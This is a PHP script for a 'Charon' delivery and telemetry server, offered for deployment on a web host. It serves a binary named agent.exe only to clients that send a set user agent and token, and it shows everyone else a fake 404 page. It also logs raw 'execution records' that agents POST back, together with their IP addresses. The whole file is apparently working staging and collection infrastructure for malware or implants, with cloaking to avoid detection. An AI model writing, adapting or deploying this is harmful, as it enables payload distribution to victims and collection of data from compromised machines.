<?php
/**
 * Charon Web Delivery & Telemetry Staging Subsystem
 * Architecture: Deploy this on any accessible web host endpoint running PHP 7.4+.
 */

define('SECURE_ACCESS_TOKEN', '994821');
define('AGENT_USER_AGENT',   'CharonAgent/1.0');
define('BINARY_PAYLOAD_FILE', 'agent.exe');
define('AUDIT_LOG_FILE',      'telemetry.log');

function validate_ingress_headers() {
    if (!isset($_SERVER['HTTP_USER_AGENT']) || $_SERVER['HTTP_USER_AGENT'] !== AGENT_USER_AGENT) {
        header('HTTP/1.1 404 Not Found');
        echo "<h1>404 Not Found</h1>The requested URL was not found on this server.";
        exit;
    }
    if (!isset($_SERVER['HTTP_X_CHARON_TOKEN']) || $_SERVER['HTTP_X_CHARON_TOKEN'] !== SECURE_ACCESS_TOKEN) {
        header('HTTP/1.1 403 Forbidden');
        echo "Access denied.";
        exit;
    }
}

function record_framework_telemetry($logMessage) {
    $remoteIpAddress = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN_IP';
    $currentDateTimeString = date('Y-m-d H:i:s');
    $logOutputBuffer = "[{$currentDateTimeString}] [Host: {$remoteIpAddress}] - {$logMessage}\n";
    file_put_contents(AUDIT_LOG_FILE, $logOutputBuffer, FILE_APPEND | LOCK_EX);
}

validate_ingress_headers();
$operation_verb = isset($_GET['action']) ? trim($_GET['action']) : '';

switch ($operation_verb) {
    case 'stage':
        if (file_exists(BINARY_PAYLOAD_FILE)) {
            record_framework_telemetry("Payload file request verified. Initializing output streaming.");
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename(BINARY_PAYLOAD_FILE) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize(BINARY_PAYLOAD_FILE));
            flush();
            readfile(BINARY_PAYLOAD_FILE);
            exit;
        } else {
            record_framework_telemetry("Staging fault: " . BINARY_PAYLOAD_FILE . " missing from disk.");
            header('HTTP/1.1 500 Internal Server Error');
            echo "Staging binary footprint missing.";
        }
        break;

    case 'report':
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $rawPostInputDataStream = file_get_contents('php://input');
            if (!empty($rawPostInputDataStream)) {
                record_framework_telemetry("Execution Record Transmitted:\n" . $rawPostInputDataStream);
                echo "ACK_SUCCESS";
            }
        }
        break;

    default:
        header('HTTP/1.1 400 Bad Request');
        echo "Invalid routine parameter mapping instructions.";
        break;
}
